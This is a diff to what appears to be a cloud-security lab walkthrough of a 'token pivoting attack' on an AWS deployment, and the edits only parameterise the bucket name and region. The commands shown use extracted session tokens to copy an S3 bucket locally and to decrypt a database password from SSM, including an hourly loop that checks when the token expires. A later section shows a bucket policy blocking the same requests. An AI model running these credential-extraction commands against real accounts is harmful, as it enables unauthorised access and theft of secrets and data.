@@ -143,14 +143,14 @@ export AWS_SESSION_TOKEN=<ENTER SESSION TOKEN>
 Run the following commands:
 
 ```bash
-aws s3 sync s3://panther-[BUCKET_UUID] ~/panther
-aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1
+aws s3 sync "s3://panther-$BUCKET_SUFFIX" ~/panther
+aws ssm get-parameter --name /panther/database/password --with-decryption --region "$AWS_REGION"
 ```
 
 Running the following test once per hour for expired keys:
 
 ```bash
-while true; do aws ssm get-parameter --name /panther/database/password --with-decryption --region us-east-1; date; sleep 3600; done
+while true; do aws ssm get-parameter --name /panther/database/password --with-decryption --region "$AWS_REGION"; date; sleep 3600; done
 ```
 
 Expiration does not appear to occur until 12 hours after extracting the token.
@@ -509,12 +509,12 @@ bucketPolicy:
 Replay the token pivoting attack again, extract the credentials to your machine, set your environment variables, and observe the response from S3 this time:
 
 ```bash
-aws s3api list-objects --bucket panther-[BUCKET_UUID]
+aws s3api list-objects --bucket "panther-$BUCKET_SUFFIX"
 An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
 ```
 
 ```bash
-aws s3 cp s3://panther-[BUCKET_UUID]/assets/panther.jpg .
+aws s3 cp "s3://panther-$BUCKET_SUFFIX/assets/panther.jpg" .
 fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
 ```
 
